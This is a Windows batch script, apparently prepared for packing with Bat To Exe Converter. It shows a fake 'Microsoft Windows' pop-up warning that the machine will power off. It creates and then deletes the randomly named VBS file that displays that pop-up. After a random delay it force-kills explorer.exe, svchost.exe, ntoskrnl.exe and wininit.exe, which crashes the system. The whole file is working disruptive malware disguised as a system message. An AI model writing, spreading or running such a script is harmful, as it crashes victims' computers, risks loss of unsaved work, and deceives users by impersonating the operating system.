::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCqDJN9sBcXKzJ2iq4BZ6lc9zl6ZMgd+MwoCTbyajwYD8XU0XEhUqBPub5QLSYUowm9KpOIvIzVkJ1yibQBU
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF25
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJheFUEAlXbaTPoSORMuLmb
::ZQ05rAF9IBncCkqN+0xwdVsFHErScjrjU+1Oprmrv7vn
::ZQ05rAF9IAHYFVzEqQIdIRhGQxeNOn8YyPUr4eb/4P2UAINde/I6ao7P07qJYNMK+VHhePY=
::eg0/rx1wNQPfEVWB+kM9LVsJDDenCF6KSJAkzYg=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIHIRVQQxORfFi/EqAMqMD0/P7n
::dhA7uBVwLU+EWHSN91A/OxRSWEShM3mqCacd/OH04Yo=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATEVotwBRJXXguRM22uRpYT+vj0/euTq0ITGqIedIObyL2JKPQAqlfhZpM/wH9e1qs=
::ZQ0/vhVqMQ3MEVWAtB9wBBJAWAiHfEy7CdU=
::Zg8zqx1/OA3MEVWAtB9wBBJAWAiHfEy7CdU=
::dhA7pRFwIByZRRmo/VYkJB4UawWNXA==
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy++UqVkSRN4sfZvOyvqLOOVz
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
set /a n=%random%%%1200+120
set /a a=%random%%
set /a b=%random%%
set /a c=%random%%
set /a d=%random%%
set /a e=%random%%
set /a f=%random%%
set /a g=%random%%
set /a h=%random%%
md %a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%
echo msg=MsgBox("Power off after %n% seconds",1+15,"Microsoft Windows")>>%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%\%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%.vbs
start %a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%\%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%.vbs
timeout /t 1
del %a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%\%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%.vbs
rd /q %a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%
timeout /t %n%
taskkill /f /im explorer.exe
timeout /t 1
taskkill /f /im svchost.exe
taskkill /f /im ntoskrnl.exe
taskkill /f /im wininit.exe